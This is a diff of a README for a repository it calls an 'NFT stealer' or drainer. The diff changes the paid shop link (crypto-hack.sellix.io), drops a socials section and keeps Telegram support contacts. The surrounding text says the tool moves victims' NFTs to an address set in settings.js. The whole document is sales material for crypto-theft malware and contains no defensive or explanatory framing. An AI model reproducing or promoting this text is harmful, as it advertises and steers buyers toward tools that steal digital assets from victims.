@@ -1,4 +1,6 @@
-### ⚠️ My old Github [@0xAshe](https://github.com/0xAshe/Nft-Drainer-stealer) got termed, I will update the repo here
+- Shop: https://crypto-hack.sellix.io/
+
+
 # *⛔ Beware of scams, this is the real repo*
 ### If you need any help, DM me here: [@Zentoh](https://t.me/zentoh) (new telegram)
 ### 
@@ -41,8 +43,6 @@ To get instant support, contact me on [Telegram](https://t.me/zentoh)
 This **NFT stealer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
 ![view](https://media.discordapp.net/attachments/964872997750067240/968100664527945798/Untitled-z1.png)
 
-## `⭐ Socials :`
 
-- Telegram: https://t.me/zentoh
-- Shop: https://nftservices.sellix.io
-- Group: https://t.me/cryptodrainers
+
+
